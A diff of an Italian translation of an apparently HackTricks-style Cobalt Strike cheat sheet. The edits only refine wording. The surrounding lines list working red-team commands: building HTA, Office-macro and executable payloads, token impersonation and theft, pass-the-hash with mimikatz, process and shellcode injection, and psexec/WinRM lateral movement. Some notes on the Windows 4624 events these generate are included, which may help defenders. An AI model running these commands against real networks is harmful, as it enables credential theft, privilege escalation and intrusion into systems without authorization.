@@ -22,7 +22,7 @@ I beacon di questi listener non devono comunicare direttamente con il C2, posson
 `Attacks -> Packages ->`&#x20;
 
 * **`HTMLApplication`** per file HTA
-* **`MS Office Macro`** per un documento di office con una macro
+* **`MS Office Macro`** per un documento office con una macro
 * **`Windows Executable`** per un .exe, .dll o servizio .exe
 * **`Windows Executable (S)`** per un **stageless** .exe, .dll o servizio .exe (meglio stageless che staged, meno IoCs)
 
@@ -63,7 +63,7 @@ powershell &#x3C;scrivi qui il comando powershell>
 make_token [DOMAIN\user] [password] #Crea un token per impersonare un utente nella rete
 ls \\computer_name\c$ # Prova a usare il token generato per accedere a C$ in un computer
 rev2self # Smetti di usare il token generato con make_token
-## L'uso di make_token genera l'evento 4624: Un account è stato effettuato con successo. Questo evento è molto comune in un dominio Windows, ma può essere ristretto filtrando sul Tipo di Accesso. Come accennato sopra, utilizza LOGON32_LOGON_NEW_CREDENTIALS che è di tipo 9.
+## L'uso di make_token genera l'evento 4624: Un account è stato effettuato l'accesso con successo. Questo evento è molto comune in un dominio Windows, ma può essere ristretto filtrando sul Tipo di Accesso. Come accennato sopra, utilizza LOGON32_LOGON_NEW_CREDENTIALS che è di tipo 9.
 
 # UAC Bypass
 elevate svc-exe &#x3C;listener>
@@ -79,7 +79,7 @@ rev2self # Smetti di usare il token da steal_token
 
 ## Avvia processo con nuove credenziali
 spawnas [domain\username] [password] [listener] #Fallo da una directory con accesso in lettura come: cd C:\
-## Come make_token, questo genererà l'evento Windows 4624: Un account è stato effettuato con successo ma con un tipo di accesso di 2 (LOGON32_LOGON_INTERACTIVE). Dettaglierà l'utente chiamante (TargetUserName) e l'utente impersonato (TargetOutboundUserName).
+## Come make_token, questo genererà l'evento Windows 4624: Un account è stato effettuato l'accesso con successo ma con un tipo di accesso di 2 (LOGON32_LOGON_INTERACTIVE). Dettaglierà l'utente chiamante (TargetUserName) e l'utente impersonato (TargetOutboundUserName).
 
 ## Inietta nel processo
 inject [pid] [x64|x86] [listener]
@@ -92,7 +92,7 @@ pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash tramite mimikatz
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Senza /run, mimikatz genera un cmd.exe, se stai eseguendo come utente con Desktop, vedrà la shell (se stai eseguendo come SYSTEM sei a posto)
+## Senza /run, mimikatz avvia un cmd.exe, se stai eseguendo come utente con Desktop, vedrà la shell (se stai eseguendo come SYSTEM sei a posto)
 steal_token &#x3C;pid> #Ruba il token dal processo creato da mimikatz
 
 ## Pass the ticket
@@ -128,7 +128,7 @@ jump [method] [target] [listener]
 ## Metodi:
 ## psexec                    x86   Usa un servizio per eseguire un artefatto Service EXE
 ## psexec64                  x64   Usa un servizio per eseguire un artefatto Service EXE
-## psexec_psh                x86   Usa un servizio per eseguire un one-liner PowerShell
+## psexec_psh                x86   Usa un servizio per eseguire una riga di comando PowerShell
 ## winrm                     x86   Esegui uno script PowerShell tramite WinRM
 ## winrm64                   x64   Esegui uno script PowerShell tramite WinRM
 
@@ -166,7 +166,7 @@ shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Inietta il codice shell di metasplo
 
 # Pass metasploit session to cobalt strike
 ## Genera shellcode Beacon stageless, vai su Attacks > Packages > Windows Executable (S), seleziona il listener desiderato, seleziona Raw come tipo di output e seleziona Usa payload x64.
-## Usa post/windows/manage/shellcode_inject in metasploit per iniettare il shellcode generato di cobalt strike
+## Usa post/windows/manage/shellcode_inject in metasploit per iniettare il codice shell di cobalt strike generato
 
 
 # Pivoting
